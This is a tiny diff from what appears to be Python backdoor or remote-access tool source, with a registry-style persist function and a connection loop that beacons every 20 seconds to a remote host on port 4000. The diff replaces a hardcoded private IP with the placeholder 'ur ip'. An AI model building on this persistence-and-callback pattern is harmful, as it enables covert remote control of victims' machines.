@@ -60,7 +60,7 @@ def persist(reg_name, copy_name):
 
 def connection():
    while True:
-       RHOST = "192.168.234.134"
+       RHOST = "ur ip"
        RPORT = 4000
        time.sleep(20)
        try:
